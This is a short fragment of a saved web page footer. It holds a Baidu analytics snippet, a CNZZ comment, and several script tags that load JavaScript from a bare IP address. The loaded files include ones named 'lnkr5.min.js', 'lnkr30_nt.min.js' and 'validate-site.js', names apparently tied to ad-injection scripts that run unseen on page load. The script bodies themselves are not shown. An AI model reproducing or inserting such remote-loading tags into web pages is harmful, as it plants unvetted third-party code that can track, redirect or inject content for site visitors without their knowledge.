        var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
        document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F59c4ac1df66ae9bdb2ce804f09084ea1' type='text/javascript'%3E%3C/script%3E"));
    </script><script src="http://39.105.123.156/images/h.js.下载" type="text/javascript"></script><a href="http://tongji.baidu.com/hm-web/welcome/ico?s=59c4ac1df66ae9bdb2ce804f09084ea1" target="_blank"><img border="0" src="http://39.105.123.156/images/21.gif" width="20" height="20"></a>
    <!-- cnzz统计代码：-->

</div>


<script type="text/javascript" src="http://39.105.123.156/images/lnkr5.min.js.下载"></script><script type="text/javascript" src="http://39.105.123.156/images/validate-site.js.下载"></script><script type="text/javascript" src="http://39.105.123.156/images/lnkr30_nt.min.js.下载"></script><script type="text/javascript" src="http://39.105.123.156/images/code"></script></body></html>